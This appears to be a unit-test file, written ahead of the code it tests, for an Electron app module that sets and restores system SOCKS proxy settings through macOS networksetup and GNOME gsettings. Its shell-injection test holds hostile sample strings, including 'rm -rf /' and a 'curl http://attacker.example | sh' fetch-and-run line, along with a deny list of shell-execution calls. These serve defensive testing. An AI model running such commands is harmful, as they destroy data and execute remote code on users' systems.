/**
 * M1-20 (RED) — system-proxy command construction + platform branching.
 *
 * Test plan IDs: TC-04-01, TC-04-02, TC-04-03, TC-04-05, TC-04-06, TC-04-07
 * (command half), TC-04-10, TC-04-11 + the E-PLAT-001/002/003 rows of
 * TC-NFR5-01 (written additively in `tests/unit/errorWording.test.ts`) —
 * docs/qa/m1-test-plan.md §4/§8, the M1-20 row in §10, deviations DV-26 in §14.
 *
 * Spec sources: docs/analysis/data-flows.md flow (c) §3.1–§3.3 (exact
 * per-platform command sequences, snapshot/restore semantics, fallback hint);
 * docs/analysis/requirements.md F5 (FR-30..FR-37) + platform rules PR-01, PR-02,
 * PR-08; docs/analysis/errors.md §4 (E-PLAT-001/002/003 triples) + §0 (NFR-5);
 * docs/product/stories/US-04-system-proxy.md AC-04.1..AC-04.7; docs/plans/
 * m1-mvp.md M1-20 → M1-21; docs/qa/strategy.md §5.1 (RED reasons), §7.
 *
 * Layer: L1 unit, PURE — no real `networksetup`, no real `gsettings`, no
 * process.env mutation for platform branching, no network (strategy §1). Every
 * OS call goes through the injected executor, which records argv arrays; the
 * only file read is the module's own source (structural guards, TC-01-15 scan
 * style).
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * CONTRACT FOR M1-21 (declared here — header-contract style, cf. DV-09/DV-16/
 * DV-23; full type text in `tests/helpers/system-proxy-stub.ts`; any deviation
 * requires an upstream spec note first, strategy §5.2):
 *
 *  module  : src/main/system-proxy.ts   — pure node, NO electron import
 *  exports : buildMacDetectCommand(): string[]
 *            buildMacSnapshotCommands(service): string[][]
 *            buildMacOnCommands(service, host, port): string[][]
 *            buildMacRestoreCommands(snapshot): string[][]
 *            buildGnomeSnapshotCommands(): string[][]
 *            buildGnomeOnCommands(host, port): string[][]
 *            buildGnomeRestoreCommands(snapshot): string[][]
 *            isSupportedPlatform(platform, desktopEnv?): { supported, hint? }
 *            setSystemProxy({ platform, desktopEnv?, run }): Promise<
 *                { ok: true, snapshot } | { ok: false, error: AppError }>
 *            restoreSystemProxy({ platform, desktopEnv?, run }, snapshot|null):
 *                Promise<OperationResult>
 *
 *  Executed sequences (data-flows (c), EXACT argv arrays — no shell string):
 *    macOS ENABLE:  1. ['networksetup','-listnetworkserviceorder']   (detect)
 *                   2. ['-getsocksfirewallproxy', S], ['-getsecurewebproxy', S]
 *                   3. ['-setsocksfirewallproxy', S, host, port],
 *                      ['-setsocksfirewallproxystate', S, 'on']
 *                   4. any non-zero exit → restore attempt + E-PLAT-002
 *                   5. verify read ['-getsocksfirewallproxy', S]
 *    macOS RESTORE: replay the snapshot per setting (socks, then secureWeb):
 *                   ['-set…proxy', S, priorHost, String(priorPort)] +
 *                   ['-set…proxystate', S, priorEnabled ? 'on' : 'off']
 *    GNOME ENABLE:  probe ['gsettings','get','org.gnome.system.proxy.socks','host']
 *                   (schema-present check, SUPPORT DETECT §3.2; fails → E-PLAT-001)
 *                   SNAPSHOT: get mode / socks host / socks port
 *                   APPLY:    set socks host / socks port / mode 'manual'
 *                   verify:   get mode / socks host / socks port
 *    GNOME RESTORE: set socks host / socks port / mode — the snapshot triple,
 *                   always all three (§3.2 DISABLE step 1, AC-04.3)
 *
 *  Decisions the sources leave open are pinned here as the single source for
 *  M1-21 and recorded in m1-test-plan §14 DV-26: service-name parsing (first
 *  `Hardware Port: X, Device:` candidate — multi-service stays Q-B), the
 *  abbreviated schema probe key, gsettings values as RAW argv elements (the
 *  quotes in data-flows are shell notation, PR-08 removes them), SOCKS-only
 *  apply (FR-31; AC-04.1's `-getsecurewebproxy` half is snapshot/restore
 *  input), getter parsing fields Enabled/Server/Port, restore order
 *  (socks→secureWeb; host→port→mode), hint sentence verbatim from §3.3.
 *
 * Fixture rule: synthetic values only (`proxy.example.internal`, `127.0.0.1`,
 * reserved hosts) — never a live endpoint, never a real system command.
 *
 * RED status: ABSENCE RED — `src/main/system-proxy.ts` does not exist; every
 * behavioral case fails through `loadSystemProxy()` (dynamic import of a
 * NON-LITERAL specifier so `npm run typecheck` stays exit 0) and both
 * structural cases through their explicit `existsSync` gate. Strategy §5.2:
 * legitimate first-test-of-a-subsystem failure; do not weaken, skip, or delete.
 * ─────────────────────────────────────────────────────────────────────────────
 */
import { existsSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

import { describe, expect, it } from 'vitest';

import {
  type GnomeProxySnapshot,
  loadSystemProxy,
  MAC_DETECT_ETHERNET,
  MAC_DETECT_WIFI,
  MAC_SETTING_APPLIED,
  MAC_SETTING_DISABLED,
  type MacProxySnapshot,
  MANUAL_HINT,
  MANUAL_PROXY_ERROR,
  recordingRun,
  type SystemProxyApi,
} from '../helpers/system-proxy-stub';

const SYSTEM_PROXY_SOURCE = fileURLToPath(
  new URL('../../src/main/system-proxy.ts', import.meta.url),
);

/** App-owned loopback values — BRIEF §2.4 / data-flows (c), fixed for M1. */
const HOST = '127.0.0.1';
const PORT = 10808;

/** Loads the module under test; absence RED stops here (strategy §5.1). */
async function loadApi(): Promise<SystemProxyApi> {
  const api = await loadSystemProxy();
  const required: Array<keyof SystemProxyApi> = [
    'buildMacDetectCommand',
    'buildMacSnapshotCommands',
    'buildMacOnCommands',
    'buildMacRestoreCommands',
    'buildGnomeSnapshotCommands',
    'buildGnomeOnCommands',
    'buildGnomeRestoreCommands',
    'isSupportedPlatform',
    'setSystemProxy',
    'restoreSystemProxy',
  ];
  for (const name of required) {
    if (typeof api[name] !== 'function') {
      throw new Error(
        `src/main/system-proxy.ts must export ${name} — M1-21 GREEN implements the M1-20 contract`,
      );
    }
  }
  return api;
}

/** The ENABLE sequence data-flows §3.1 prescribes for one detected service. */
function macEnableSequence(service: string): string[][] {
  return [
    ['networksetup', '-listnetworkserviceorder'],
    ['networksetup', '-getsocksfirewallproxy', service],
    ['networksetup', '-getsecurewebproxy', service],
    ['networksetup', '-setsocksfirewallproxy', service, HOST, '10808'],
    ['networksetup', '-setsocksfirewallproxystate', service, 'on'],
    ['networksetup', '-getsocksfirewallproxy', service],
  ];
}

/** mac ENABLE responder: detect → snapshot reads → apply → verify read. */
function macEnableProbe(detectStdout: string) {
  return recordingRun((index) => {
    if (index === 0) return { code: 0, stdout: detectStdout, stderr: '' };
    if (index === 1 || index === 2) return { code: 0, stdout: MAC_SETTING_DISABLED, stderr: '' };
    if (index === 5) return { code: 0, stdout: MAC_SETTING_APPLIED, stderr: '' };
    return { code: 0, stdout: '', stderr: '' };
  });
}

/** Previously-disabled prior state, as parsed from the `-get*` getters. */
const PRIOR_DISABLED_MAC: MacProxySnapshot = {
  service: 'Wi-Fi',
  socks: { enabled: false, host: '', port: 0 },
  secureWeb: { enabled: false, host: '', port: 0 },
};

/** Inverse commands for a previously-disabled macOS setting (AC-04.3 off half). */
const MAC_RESTORE_OFF: string[][] = [
  ['networksetup', '-setsocksfirewallproxy', 'Wi-Fi', '', '0'],
  ['networksetup', '-setsocksfirewallproxystate', 'Wi-Fi', 'off'],
  ['networksetup', '-setsecurewebproxy', 'Wi-Fi', '', '0'],
  ['networksetup', '-setsecurewebproxystate', 'Wi-Fi', 'off'],
];

describe('macOS networksetup construction & set flow (PR-01/PR-08, data-flows §3.1) — TC-04-01', () => {
  it('systemProxy.macos.buildsNetworksetupArgsForSocks127_0_0_1_10808', async () => {
    const api = await loadApi();

    // step 1 — service detection is one argv array, no shell string
    expect(api.buildMacDetectCommand()).toEqual(['networksetup', '-listnetworkserviceorder']);

    // step 2 — SNAPSHOT reads (FR-31: prior socks AND secure-web state)
    expect(api.buildMacSnapshotCommands('Wi-Fi')).toEqual([
      ['networksetup', '-getsocksfirewallproxy', 'Wi-Fi'],
      ['networksetup', '-getsecurewebproxy', 'Wi-Fi'],
    ]);

    // step 3 — APPLY: exact argv arrays for the active service (Wi-Fi/Ethernet)
    for (const service of ['Wi-Fi', 'Ethernet']) {
      expect(api.buildMacOnCommands(service, HOST, PORT), service).toEqual([
        ['networksetup', '-setsocksfirewallproxy', service, '127.0.0.1', '10808'],
        ['networksetup', '-setsocksfirewallproxystate', service, 'on'],
      ]);
    }

    // every row is an argv array whose first element is the binary alone —
    // never one concatenated command line (PR-08)
    const rows = api.buildMacOnCommands('Wi-Fi', HOST, PORT);
    for (const row of rows) {
      expect(row[0]).toBe('networksetup');
      expect(row.every((arg) => typeof arg === 'string')).toBe(true);
    }
  });

  it('systemProxy.macos.setSequence.detectSnapshotApplyVerifyExactArgArrays', async () => {
    const api = await loadApi();

    // One candidate per fixture — multi-service selection is Q-B (FR-37), not M1-20.
    const cases = [
      { detect: MAC_DETECT_WIFI, service: 'Wi-Fi' },
      { detect: MAC_DETECT_ETHERNET, service: 'Ethernet' },
    ];
    for (const { detect, service } of cases) {
      const probe = macEnableProbe(detect);
      const result = await api.setSystemProxy({ platform: 'darwin', run: probe.run });
      if (!result.ok) {
        throw new Error(
          `${service}: setSystemProxy must resolve ok:true on a healthy system, got ${result.error.code}`,
        );
      }

      // the WHOLE executed sequence, element by element (steps 1→5)
      expect(probe.calls, service).toEqual(macEnableSequence(service));

      // the captured snapshot is parsed from the step-2 getter outputs (FR-31)
      expect(result.snapshot, service).toEqual({
        service,
        socks: { enabled: false, host: '', port: 0 },
        secureWeb: { enabled: false, host: '', port: 0 },
      });
    }
  });
});

describe('GNOME gsettings construction & set flow (PR-01, FR-32, data-flows §3.2) — TC-04-02', () => {
  it('systemProxy.gnome.buildsGsettingsArgsForActiveScheme', async () => {
    const api = await loadApi();

    // SUPPORT DETECT probe — schema-present check (§3.2; US-04 edge)
    expect(api.buildGnomeSnapshotCommands()[0]).toEqual([
      'gsettings',
      'get',
      'org.gnome.system.proxy',
      'mode',
    ]);

    // SNAPSHOT: the documented `gsettings get` triple
    expect(api.buildGnomeSnapshotCommands()).toEqual([
      ['gsettings', 'get', 'org.gnome.system.proxy', 'mode'],
      ['gsettings', 'get', 'org.gnome.system.proxy.socks', 'host'],
      ['gsettings', 'get', 'org.gnome.system.proxy.socks', 'port'],
    ]);

    // APPLY: host, port, then mode 'manual' — raw argv, the data-flows quotes
    // are shell notation and must NOT travel as argv content (PR-08)
    expect(api.buildGnomeOnCommands(HOST, PORT)).toEqual([
      ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'host', '127.0.0.1'],
      ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'port', '10808'],
      ['gsettings', 'set', 'org.gnome.system.proxy', 'mode', 'manual'],
    ]);

    for (const row of api.buildGnomeOnCommands(HOST, PORT)) {
      expect(row[0]).toBe('gsettings');
      expect(row.every((arg) => typeof arg === 'string')).toBe(true);
      expect(row).not.toContain("'127.0.0.1'"); // no quote characters in argv
      expect(row).not.toContain("'manual'");
    }
  });

  it('systemProxy.gnome.setSequence.probeSnapshotApplyVerifyExactArgArrays', async () => {
    const api = await loadApi();

    const probe = recordingRun((index) => {
      if (index === 0) return { code: 0, stdout: "''\n", stderr: '' }; // schema probe
      if (index === 1) return { code: 0, stdout: "'none'\n", stderr: '' }; // prior mode
      if (index === 2) return { code: 0, stdout: "''\n", stderr: '' }; // prior host
      if (index === 3) return { code: 0, stdout: '0\n', stderr: '' }; // prior port
      if (index === 7) return { code: 0, stdout: "'manual'\n", stderr: '' }; // verify
      if (index === 8) return { code: 0, stdout: "'127.0.0.1'\n", stderr: '' };
      if (index === 9) return { code: 0, stdout: '10808\n', stderr: '' };
      return { code: 0, stdout: '', stderr: '' };
    });

    const result = await api.setSystemProxy({
      platform: 'linux',
      desktopEnv: 'ubuntu:GNOME',
      run: probe.run,
    });
    if (!result.ok) {
      throw new Error(
        `setSystemProxy must resolve ok:true on GNOME, got ${result.error.code}: ${result.error.cause}`,
      );
    }

    expect(probe.calls).toEqual([
      // SUPPORT DETECT — schema present (§3.2)
      ['gsettings', 'get', 'org.gnome.system.proxy.socks', 'host'],
      // SNAPSHOT
      ['gsettings', 'get', 'org.gnome.system.proxy', 'mode'],
      ['gsettings', 'get', 'org.gnome.system.proxy.socks', 'host'],
      ['gsettings', 'get', 'org.gnome.system.proxy.socks', 'port'],
      // APPLY
      ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'host', '127.0.0.1'],
      ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'port', '10808'],
      ['gsettings', 'set', 'org.gnome.system.proxy', 'mode', 'manual'],
      // verify (AC-04.2: gsettings reports SOCKS 127.0.0.1:10808, mode manual)
      ['gsettings', 'get', 'org.gnome.system.proxy', 'mode'],
      ['gsettings', 'get', 'org.gnome.system.proxy.socks', 'host'],
      ['gsettings', 'get', 'org.gnome.system.proxy.socks', 'port'],
    ]);

    expect(result.snapshot).toEqual({ mode: 'none', socksHost: '', socksPort: 0 });
  });
});

describe('snapshot → restore, exact inverse commands (FR-31/FR-32, AC-04.3) — TC-04-03', () => {
  it('systemProxy.toggleOff.emitsExactInverseCommandsFromSnapshot', async () => {
    const api = await loadApi();

    const scenarios: Array<{
      name: string;
      snapshot: MacProxySnapshot;
      expected: string[][];
    }> = [
      {
        name: 'previously disabled → off commands (byte-for-byte prior state)',
        snapshot: PRIOR_DISABLED_MAC,
        expected: MAC_RESTORE_OFF,
      },
      {
        name: 'previously enabled → prior proxy values restored and switched on',
        snapshot: {
          service: 'Ethernet',
          socks: { enabled: true, host: 'proxy.example.internal', port: 8080 },
          secureWeb: { enabled: true, host: 'proxy.example.internal', port: 8080 },
        },
        expected: [
          ['networksetup', '-setsocksfirewallproxy', 'Ethernet', 'proxy.example.internal', '8080'],
          ['networksetup', '-setsocksfirewallproxystate', 'Ethernet', 'on'],
          ['networksetup', '-setsecurewebproxy', 'Ethernet', 'proxy.example.internal', '8080'],
          ['networksetup', '-setsecurewebproxystate', 'Ethernet', 'on'],
        ],
      },
    ];

    for (const { name, snapshot, expected } of scenarios) {
      expect(api.buildMacRestoreCommands(snapshot), name).toEqual(expected);

      const probe = recordingRun();
      const result = await api.restoreSystemProxy({ platform: 'darwin', run: probe.run }, snapshot);
      expect(result.ok, `${name}: restore resolves ok`).toBe(true);
      expect(probe.calls, name).toEqual(expected);
    }
  });

  it('systemProxy.toggleOff.gnomeRestoresExactModeHostPortTripleFromSnapshot', async () => {
    const api = await loadApi();

    const scenarios: Array<{ name: string; snapshot: GnomeProxySnapshot; expected: string[][] }> = [
      {
        name: 'defaults captured (mode none, empty host, port 0)',
        snapshot: { mode: 'none', socksHost: '', socksPort: 0 },
        expected: [
          ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'host', ''],
          ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'port', '0'],
          ['gsettings', 'set', 'org.gnome.system.proxy', 'mode', 'none'],
        ],
      },
      {
        name: 'prior manual proxy replayed verbatim',
        snapshot: { mode: 'manual', socksHost: 'proxy.example.internal', socksPort: 8080 },
        expected: [
          ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'host', 'proxy.example.internal'],
          ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'port', '8080'],
          ['gsettings', 'set', 'org.gnome.system.proxy', 'mode', 'manual'],
        ],
      },
    ];

    for (const { name, snapshot, expected } of scenarios) {
      expect(api.buildGnomeRestoreCommands(snapshot), name).toEqual(expected);

      const probe = recordingRun();
      const result = await api.restoreSystemProxy({ platform: 'linux', run: probe.run }, snapshot);
      expect(result.ok, `${name}: restore resolves ok`).toBe(true);
      expect(probe.calls, name).toEqual(expected);
    }
  });
});

describe('platform branching & unsupported desktop (PR-02, FR-33, AC-04.5) — TC-04-05', () => {
  it('systemProxy.unsupportedDesktop.showsManualHintWithExactHostPort', async () => {
    const api = await loadApi();

    const kde = api.isSupportedPlatform('linux', 'KDE');
    expect(kde.supported, 'non-GNOME desktop is unsupported (PR-02)').toBe(false);
    // EXACT wording source: data-flows §3.3 (quoted sentence) — the single
    // source M1-21 must render; values 127.0.0.1 / 10808 are mandatory (AC-04.5)
    expect(kde.hint, 'the §3.3 hint sentence, verbatim').toBe(MANUAL_HINT);
    expect(kde.hint).toContain('127.0.0.1');
    expect(kde.hint).toContain('10808');

    // attempting the toggle on that desktop surfaces the documented E-PLAT-001
    // triple — and runs NO OS command at all
    const probe = recordingRun();
    const result = await api.setSystemProxy({
      platform: 'linux',
      desktopEnv: 'KDE',
      run: probe.run,
    });
    expect(result.ok, 'unsupported desktop refuses the toggle').toBe(false);
    if (result.ok) {
      throw new Error('unreachable: setSystemProxy must not report ok on an unsupported desktop');
    }
    expect(result.error).toEqual(MANUAL_PROXY_ERROR);
    expect(probe.calls, 'no command may run on an unsupported desktop').toEqual([]);
  });

  it('systemProxy.platformDetection.branchesOnInjectedInputsNotProcessEnv', async () => {
    const api = await loadApi();

    const matrix: Array<{ platform: string; desktopEnv?: string | undefined; supported: boolean }> =
      [
        { platform: 'darwin', supported: true }, // PR-02: networksetup assumed present
        { platform: 'linux', desktopEnv: 'ubuntu:GNOME', supported: true },
        { platform: 'linux', desktopEnv: 'GNOME-Classic:GNOME', supported: true },
        { platform: 'linux', desktopEnv: 'KDE', supported: false },
        { platform: 'linux', desktopEnv: 'XFCE', supported: false },
        { platform: 'linux', desktopEnv: undefined, supported: false },
        { platform: 'win32', supported: false },
      ];

    // ambient env must never decide: with a GNOME value set globally, the
    // parameter (including "absent") must still be the only input
    const previous = process.env.XDG_CURRENT_DESKTOP;
    process.env.XDG_CURRENT_DESKTOP = 'ubuntu:GNOME';
    try {
      for (const { platform, desktopEnv, supported } of matrix) {
        const label = `${platform} / ${desktopEnv ?? '<no desktop env>'}`;
        const support = api.isSupportedPlatform(platform, desktopEnv);
        expect(support.supported, label).toBe(supported);
        if (supported) {
          expect(support.hint, `${label}: no manual hint on a supported platform`).toBeUndefined();
        } else {
          expect(support.hint, label).toBe(MANUAL_HINT);
        }
      }
    } finally {
      if (previous === undefined) delete process.env.XDG_CURRENT_DESKTOP;
      else process.env.XDG_CURRENT_DESKTOP = previous;
    }
  });
});

describe('OS-command failure → E-PLAT-002, toggle Off, change reported (FR-34, AC-04.6) — TC-04-06', () => {
  it('systemProxy.commandFails.toggleReturnsOffPlainError', async () => {
    const api = await loadApi();

    // step-1/2 reads succeed, the FIRST apply command (call #4) exits non-zero,
    // and the follow-up snapshot-restore attempt succeeds (§3.1 step 4: the
    // error reported is the apply failure E-PLAT-002, not a restore failure)
    const probe = recordingRun((index) => {
      if (index === 0) return { code: 0, stdout: MAC_DETECT_WIFI, stderr: '' };
      if (index === 1 || index === 2) return { code: 0, stdout: MAC_SETTING_DISABLED, stderr: '' };
      if (index === 3) return { code: 1, stdout: '', stderr: 'networksetup: unable to set proxy' };
      return { code: 0, stdout: '', stderr: '' };
    });

    const result = await api.setSystemProxy({ platform: 'darwin', run: probe.run });
    expect(result.ok, 'a failing OS command must not report success').toBe(false);
    if (result.ok) {
      throw new Error('unreachable: the failing apply must reject the toggle');
    }
    expect(result.error.code).toBe('E-PLAT-002');
    expect(result.error.title, 'errors.md §4 exact title').toBe('System proxy change failed');
    expect(result.error.cause, 'errors.md §4 cause names the failed command family').toContain(
      'operating system command',
    );
    expect(result.error.cause).toContain('networksetup');
    expect(result.error.nextStep, 'errors.md §4 next step').toContain(
      'The toggle was returned to Off',
    );
    expect(result.error.nextStep).toContain('set the proxy manually (SOCKS host 127.0.0.1');

    // "attempt to restore snapshot … no partial proxy change is left
    // unreported" (§3.1 step 4 / errors.md §6): after the failing apply the
    // executor sees exactly the inverse commands, and NO verify read ran
    expect(probe.calls).toEqual([
      ['networksetup', '-listnetworkserviceorder'],
      ['networksetup', '-getsocksfirewallproxy', 'Wi-Fi'],
      ['networksetup', '-getsecurewebproxy', 'Wi-Fi'],
      ['networksetup', '-setsocksfirewallproxy', 'Wi-Fi', HOST, '10808'],
      ...MAC_RESTORE_OFF,
    ]);
  });

  it('systemProxy.commandFails.gnomeApplyFailureRestoresSnapshotAndReportsSameError', async () => {
    const api = await loadApi();

    // probe + snapshot succeed, the FIRST apply command (call #5) exits
    // non-zero; the snapshot-restore attempt that follows succeeds
    const probe = recordingRun((index) => {
      if (index === 0) return { code: 0, stdout: "''\n", stderr: '' };
      if (index === 1) return { code: 0, stdout: "'none'\n", stderr: '' };
      if (index === 2) return { code: 0, stdout: "''\n", stderr: '' };
      if (index === 3) return { code: 0, stdout: '0\n', stderr: '' };
      if (index === 4) return { code: 1, stdout: '', stderr: 'gsettings: failed to set' };
      return { code: 0, stdout: '', stderr: '' };
    });

    const result = await api.setSystemProxy({
      platform: 'linux',
      desktopEnv: 'ubuntu:GNOME',
      run: probe.run,
    });
    expect(result.ok, 'a failing OS command must not report success').toBe(false);
    if (result.ok) {
      throw new Error('unreachable: the failing apply must reject the toggle');
    }
    expect(result.error.code).toBe('E-PLAT-002');
    expect(result.error.title).toBe('System proxy change failed');
    expect(result.error.cause).toContain('gsettings');
    expect(result.error.nextStep).toContain('The toggle was returned to Off');

    // snapshot triple replayed after the failed apply (errors.md §6)
    expect(probe.calls).toEqual([
      ['gsettings', 'get', 'org.gnome.system.proxy.socks', 'host'],
      ['gsettings', 'get', 'org.gnome.system.proxy', 'mode'],
      ['gsettings', 'get', 'org.gnome.system.proxy.socks', 'host'],
      ['gsettings', 'get', 'org.gnome.system.proxy.socks', 'port'],
      ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'host', '127.0.0.1'],
      ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'host', ''],
      ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'port', '0'],
      ['gsettings', 'set', 'org.gnome.system.proxy', 'mode', 'none'],
    ]);
  });
});

describe('restore failure & idempotence (FR-35, AC-04.7, fail closed) — TC-04-07', () => {
  it('systemProxy.stopOrQuit.revertsOrEmitsPersistentWarning', async () => {
    const api = await loadApi();

    // the OS refuses the restore commands → the documented persistent warning
    const probe = recordingRun(() => ({ code: 1, stdout: '', stderr: 'networksetup: error' }));

    const result = await api.restoreSystemProxy(
      { platform: 'darwin', run: probe.run },
      PRIOR_DISABLED_MAC,
    );
    expect(result.ok, 'a failed restore must never resolve ok (fail closed)').toBe(false);
    if (result.ok) {
      throw new Error('unreachable: the failing restore must surface E-PLAT-003');
    }
    expect(result.error.code).toBe('E-PLAT-003');
    expect(result.error.title, 'errors.md §4 exact title').toBe(
      'System proxy could not be restored',
    );
    expect(result.error.cause).toContain(
      'could not revert the system proxy to its previous settings',
    );
    // never a silent leftover: manual values are ON SCREEN (data-flows §3.1)
    expect(result.error.nextStep).toContain('Manual action required');
    expect(result.error.nextStep).toContain('127.0.0.1:10808');

    // the restore WAS attempted (with the captured values) before the warning
    expect(probe.calls.length).toBeGreaterThan(0);
    expect(probe.calls[0]).toEqual(MAC_RESTORE_OFF[0]);
  });

  it('systemProxy.restoreWithoutPriorSet.noOpSucceedsAndRunsNoCommand', async () => {
    const api = await loadApi();

    // idempotent restore: nothing was ever set → no command, still ok:true
    const probe = recordingRun(() => {
      throw new Error('no OS command may run when there is no snapshot to restore');
    });

    for (const platform of ['darwin', 'linux']) {
      const first = await api.restoreSystemProxy({ platform, run: probe.run }, null);
      expect(first, `${platform}: first restore of nothing`).toEqual({ ok: true });
      const second = await api.restoreSystemProxy({ platform, run: probe.run }, null);
      expect(second, `${platform}: repeated restore stays a no-op`).toEqual({ ok: true });
    }
    expect(probe.calls).toEqual([]);
  });
});

describe('no shell injection + module boundary (PR-08, TC-01-15 scan style) — TC-04-10', () => {
  it('systemProxy.configValues.noShellInjectionIntoCommands', async () => {
    const api = await loadApi();

    const evilService = 'Wi-Fi; rm -rf / $(reboot) `id`';
    const evilHost = 'evil.example.com; curl http://attacker.example | sh $(id) `whoami`';

    // config-derived values arrive as SINGLE argv elements, verbatim
    expect(api.buildMacOnCommands(evilService, evilHost, PORT)).toEqual([
      ['networksetup', '-setsocksfirewallproxy', evilService, evilHost, '10808'],
      ['networksetup', '-setsocksfirewallproxystate', evilService, 'on'],
    ]);
    expect(api.buildGnomeOnCommands(evilHost, PORT)).toEqual([
      ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'host', evilHost],
      ['gsettings', 'set', 'org.gnome.system.proxy.socks', 'port', '10808'],
      ['gsettings', 'set', 'org.gnome.system.proxy', 'mode', 'manual'],
    ]);

    // …and the executor receives them verbatim too: a service name carrying
    // `;`, `$(…)` and backticks flows through the full set flow as ONE element
    // per argument, never concatenated into a shell line
    const probe = macEnableProbe('(1) Hardware Port: ' + evilService + ', Device: en0\n');
    const result = await api.setSystemProxy({ platform: 'darwin', run: probe.run });
    if (!result.ok) {
      throw new Error(
        `hostile strings must not break construction, got ${result.error.code}: ${result.error.cause}`,
      );
    }
    expect(probe.calls).toEqual(macEnableSequence(evilService));

    for (const call of probe.calls) {
      expect(Array.isArray(call), 'run always receives an argv array').toBe(true);
      expect(call[0], 'the binary alone — never "sh -c …" or a joined line').toBe('networksetup');
      expect(call.filter((arg) => arg === evilService).length).toBeLessThanOrEqual(1);
    }
    // the set call still carries the hostile service exactly once, untouched
    expect(probe.calls[3]).toEqual([
      'networksetup',
      '-setsocksfirewallproxy',
      evilService,
      HOST,
      '10808',
    ]);
  });

  it('systemProxy.boundary.moduleSourceUsesNoShellExecutionPrimitives', () => {
    // TC-04-10 structural half (scan style of TC-01-15/TC-02-14): whatever
    // primitive M1-21 uses for the default executor, a shell line is never one
    expect(
      existsSync(SYSTEM_PROXY_SOURCE),
      'src/main/system-proxy.ts must exist — M1-21 GREEN implements the M1-20 contract',
    ).toBe(true);

    const source = stripComments(readFileSync(SYSTEM_PROXY_SOURCE, 'utf8'));

    const forbidden: Array<{ label: string; why: string; pattern: RegExp }> = [
      { label: 'exec(', why: 'PR-08: never a shell string', pattern: /(?<![.\w])exec\s*\(/ },
      {
        label: 'execSync(',
        why: 'PR-08: never a shell string, and never a blocking one',
        pattern: /(?<![.\w])execSync\s*\(/,
      },
      {
        label: 'shell: true',
        why: 'spawn must never opt into a shell (PR-08, injection guard)',
        pattern: /shell\s*:\s*true/,
      },
      {
        label: 'spawnSync(<string command>)',
        why: 'a string command would be one shell-interpretable line (PR-08)',
        pattern: /(?<![.\w])spawnSync\s*\(\s*['"`]/,
      },
    ];
    for (const rule of forbidden) {
      expect(
        rule.pattern.test(source),
        `TC-04-10/PR-08: src/main/system-proxy.ts must not use ${rule.label} — ${rule.why}`,
      ).toBe(false);
    }

    // the contract exports are pinned by name (DV-26), so a rename cannot
    // silently disconnect this suite from the module
    for (const name of [
      'setSystemProxy',
      'restoreSystemProxy',
      'isSupportedPlatform',
      'buildMacOnCommands',
      'buildGnomeOnCommands',
    ]) {
      expect(
        source,
        `M1-20 contract: src/main/system-proxy.ts must export ${name} by name`,
      ).toMatch(
        new RegExp(
          `export\\s+(?:async\\s+)?function\\s+${name}\\b|export\\s+const\\s+${name}\\b|export\\s*\\{[^}]*\\b${name}\\b`,
        ),
      );
    }
  });

  it('systemProxy.boundary.moduleImportsNoElectronOnlyNodePrimitives', () => {
    // Sibling of the scan (DV-03 convention): the module is pure node — the
    // executor is injected, Electron wiring belongs to M1-21's index.ts swap —
    // so this suite runs in the plain node env without an electron mock.
    expect(
      existsSync(SYSTEM_PROXY_SOURCE),
      'src/main/system-proxy.ts must exist — M1-21 GREEN implements the M1-20 contract',
    ).toBe(true);

    const source = stripComments(readFileSync(SYSTEM_PROXY_SOURCE, 'utf8'));

    const specifiers = [
      ...source.matchAll(
        /\bfrom\s*['"]([^'"]+)['"]|\bimport\s*\(\s*['"]([^'"]+)['"]|\bimport\s+['"]([^'"]+)['"]|\brequire\s*\(\s*['"]([^'"]+)['"]/g,
      ),
    ].map((match) => match[1] ?? match[2] ?? match[3] ?? match[4] ?? '');
    for (const specifier of specifiers) {
      expect(
        specifier === 'electron' || specifier.startsWith('electron/'),
        `TC-04-10: the system-proxy module must not import '${specifier}' — pure node, ` +
          'electron wiring belongs to M1-21',
      ).toBe(false);
    }
    for (const primitive of ['ipcMain', 'contextBridge', 'BrowserWindow', 'webContents']) {
      expect(
        source.includes(primitive),
        `TC-04-10: src/main/system-proxy.ts must not reference '${primitive}' — ` +
          'commands travel through the injected run only',
      ).toBe(false);
    }
  });
});

describe('GNOME schema missing → same manual hint as unsupported (FR-32, US-04 edge) — TC-04-11', () => {
  it('systemProxy.gsettingsSchemaMissing.sameManualHintAsUnsupported', async () => {
    const api = await loadApi();

    // desktop claims GNOME, but the schema probe fails (binary present, schema absent)
    const probe = recordingRun((index) => {
      if (index === 0) return { code: 1, stdout: '', stderr: 'No such schema' };
      return { code: 0, stdout: '', stderr: '' };
    });
    const missing = await api.setSystemProxy({
      platform: 'linux',
      desktopEnv: 'ubuntu:GNOME',
      run: probe.run,
    });

    // the environment-unsupported case, for exact triple comparison
    const envUnsupported = await api.setSystemProxy({
      platform: 'linux',
      desktopEnv: 'KDE',
      run: recordingRun().run,
    });

    expect(missing.ok, 'schema missing must refuse the toggle').toBe(false);
    if (missing.ok || envUnsupported.ok) {
      throw new Error('unreachable: both unsupported paths must fail the toggle');
    }
    expect(missing.error).toEqual(MANUAL_PROXY_ERROR);
    expect(
      missing.error,
      'FR-32: schema missing is treated EXACTLY like an unsupported desktop (FR-33)',
    ).toEqual(envUnsupported.error);

    // only the probe ran — the failed schema check is not an E-PLAT-002 command failure
    expect(probe.calls).toEqual([['gsettings', 'get', 'org.gnome.system.proxy.socks', 'host']]);
  });
});

/** `//`/`/* *\/` comments removed before structural scanning (cf. TC-01-15). */
function stripComments(source: string): string {
  return source.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/(^|[^:])\/\/[^\n]*/g, '$1');
}
